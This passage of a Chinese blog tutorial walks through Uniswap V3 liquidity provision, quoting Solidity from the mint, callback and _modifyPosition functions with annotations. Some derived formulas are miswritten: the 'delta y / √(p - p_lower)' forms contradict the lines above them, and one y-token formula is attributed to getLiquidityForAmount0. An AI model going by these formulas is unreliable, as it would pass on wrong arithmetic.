transform="translate(2071.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3071.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5119.2" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(7651.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(8707.3,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br></code></pre></td></tr></table></figure><p>比较两种算法的结果，取更小的一个</p><p>情况三：当前池中的价格大于等于价格范围的最大值</p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819162404788.png" alt="image-20220819162404788"></p><p>此时添加的流动性全部为y token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.459ex;" xmlns="http://www.w3.org/2000/svg" width="17.491ex" height="5.608ex" role="img" focusable="false" viewbox="0 -1392 7731.2 2478.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>以上过程表示在getLiquidityForAmount0中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount1(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount1<br>) internal pure returns (uint128 liquidity) {<br>//排序<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    return toUint128(FullMath.mulDiv(amount1, FixedPoint96.Q96, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><h3 id="MintCallbackData"><a href="#MintCallbackData" class="headerlink" title="MintCallbackData"></a>MintCallbackData</h3><p>这里是为了将Position的owner和实际流动性token的支付者解耦，让合约来管理用户的流动性，并将流动性token化（ERC721）</p><p>用户调用NonfungiblePositionManager来提供流动性，所以Position的owner是NonfungiblePositionManager，NonfungiblePositionManager是通过NFT token将Position和用户关联起来的</p><p>这个函数可以将指定数量的token0与token1发送到合约中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct MintCallbackData {<br>        PoolAddress.PoolKey poolKey;<br>        address payer; //支付token的地址<br>    }<br><br>    /// @inheritdoc IUniswapV3MintCallback<br>    function uniswapV3MintCallback(<br>        uint256 amount0Owed,<br>        uint256 amount1Owed,<br>        bytes calldata data<br>    ) external override {<br>        MintCallbackData memory decoded = abi.decode(data, (MintCallbackData));<br>        CallbackValidation.verifyCallback(factory, decoded.poolKey);<br><br>//根据传入的参数，使用transferFrom代用户向Pool中支付token<br>        if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);<br>        if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="mint"><a href="#mint" class="headerlink" title="mint"></a>mint</h2><p>位于UniswapV3Pool.sol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3PoolActions<br>/// @dev noDelegateCall is applied indirectly via _modifyPosition<br>function mint(<br>    address recipient, //创造流动性的地址<br>    int24 tickLower, //流动性头寸下限<br>    int24 tickUpper, //流动性头寸上限<br>    uint128 amount, //增加的流动性数量<br>    bytes calldata data //回调函数的参数<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//检查增加的流动性的数量大于0<br>    require(amount &gt; 0);<br>    //修改Position，添加流动性，详见下面的_modifyPosition部分<br>    //返回需要投入的token0和token1的数量<br>    (, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: recipient,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(amount0Int);<br>    amount1 = uint256(amount1Int);<br><br>    uint256 balance0Before;<br>    uint256 balance1Before;<br>    if (amount0 &gt; 0) balance0Before = balance0();<br>    if (amount1 &gt; 0) balance1Before = balance1();<br>    //回调函数将指定数量的token0和token1发送到合约中<br>    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);<br>    //检查投入的token0和token1是否符合预期的数量<br>    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), 'M0');<br>    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), 'M1');<br><br>    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure><h2 id="modifyPosition"><a href="#modifyPosition" class="headerlink" title="_modifyPosition"></a>_modifyPosition</h2><p>ModifyPositionParams用于存储Position(流动性)相关的数据信息，包括流动性所有者地址、流动性的上下限、流动性的改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct ModifyPositionParams {<br>    // the address that owns the position<br>    address owner;<br>    // the lower and upper tick of the position<br>    int24 tickLower;<br>    int24 tickUpper;<br>    // any change in liquidity<br>    int128 liquidityDelta;<br>}<br></code></pre></td></tr></table></figure><p>_modifyPosition用于更新当前Position</p><p>添加流动性的规则</p><p>我们知道V3的核心公式</p><blockquote><p>y = p*x</p><p>x*y = L^2</p></blockquote><p>可以得到</p><blockquote><p>x = L / √p </p><p>y = L * √p</p></blockquote><p><strong>当价格p在区间内时</strong></p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819162436593.png" alt="image-20220819162436593"></p><p>橙色区域是我们实际需要添加的流动性，虚拟流动性是绿色区域扣除橙色的部分的宽度和高度。</p><p><code>delta x</code> 就是 <code>p</code>（红点） 和 <code>p_upper</code> 在 x 轴上的距离， <code>delta y</code> 就是 <code>p</code> 和 <code>p_lower</code> 在 y 轴上的距离。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">delta</span> x = L / √p - L / √p_{<span class="hljs-built_in">upper</span>} = L * (√p_{<span class="hljs-built_in">upper</span>} - √p) / (√p * √p_{<span class="hljs-built_in">upper</span>}) <br><br><span class="hljs-built_in">delta</span> y = L * √p  - L * √p_{<span class="hljs-built_in">lower</span>} = L * (√p - √p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>再变换一下，改写成求 L（流动性数量）的等式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs math">L = delta x * (√p * √p_{upper}) / (√p_{upper} - √p) <br>L = delta y / √(p - p_{lower})<br></code></pre></td></tr></table></figure><p><strong>当价格p大于区间时</strong></p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819162505525.png" alt="image-20220819162505525"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> y / √(p_{<span class="hljs-built_in">upper</span>} - p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p><strong>当价格p小于区间时</strong></p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819162537608.png" alt="image-20220819162537608"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> x * (√p_{<span class="hljs-built_in">upper</span>} * √p_{<span class="hljs-built_in">lower</span>}) / (√p_{<span class="hljs-built_in">upper</span>} - √p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>转化为代码</p><p>注意：这里的amount0与amount1为int256类型，也就是说这里的amount0与amount1这两个返回值可正可负，如果为正则表示流动性提供至需要给池子给予的数量，为负数则表示池子需要给流动性提供者给予的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @dev Effect some changes to a position<br>  /// @param params the position details and the change to the position's liquidity to effect<br>  /// @return position a storage pointer referencing the position with the given owner and tick range<br>  /// @return amount0 the amount of token0 owed to the pool, negative if the pool should pay the recipient<br>  /// @return amount1 the amount of token1 owed to the pool, negative if the pool should pay the recipient<br>  function _modifyPosition(ModifyPositionParams memory params)<br>      private<br>      noDelegateCall<br>      returns (<br>          Position.Info storage position,<br>          int256 amount0,<br>          int256 amount1<br>      )<br>  {<br>  //检查流动性上下限是否满足条件<br>      checkTicks(params.tickLower, params.tickUpper);<br><br>//读入内存，这样后续可以通过MLOAD直接访问而不用重新去加载LOAD，从而节省gas<br>      Slot0 memory _slot0 = slot0; // SLOAD for gas optimization<br><br>//创建或修改用户的position，后面有介绍<br>      position = _updatePosition(<br>          params.owner,<br>          params.tickLower,<br>          params.tickUpper,<br>          params.liquidityDelta,<br>          _slot0.tick<br>      );<br><br>      if (params.liquidityDelta != 0) {<br>          if (_slot0.tick &lt; params.tickLower) {<br>              // current tick is below the passed range; liquidity can only become in range by crossing from left to<br>              // right, when we'll need _more_ token0 (it's becoming more valuable) so user must provide it<br>              //如果当前的trick小于tricklower，则所有的token1将转变为token0<br>              //即liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          } else if (_slot0.tick &lt; params.tickUpper) {<br>              // current tick is inside the passed range<br>              //如果当前trick小于trickupper<br>              uint128 liquidityBefore = liquidity; // SLOAD for gas optimization<br><br>              // write an oracle entry<br>              //增加Oracle条目（预言机）<br>              (slot0.observationIndex, slot0.observationCardinality) = observations.write(<br>                  _slot0.observationIndex,<br>                  _blockTimestamp(),<br>                  _slot0.tick,<br>                  liquidityBefore,<br>                  _slot0.observationCardinality,<br>                  _slot0.observationCardinalityNext<br>              );<br><br>              //计算amout0和amount1的增量<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  _slot0.sqrtPriceX96,<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  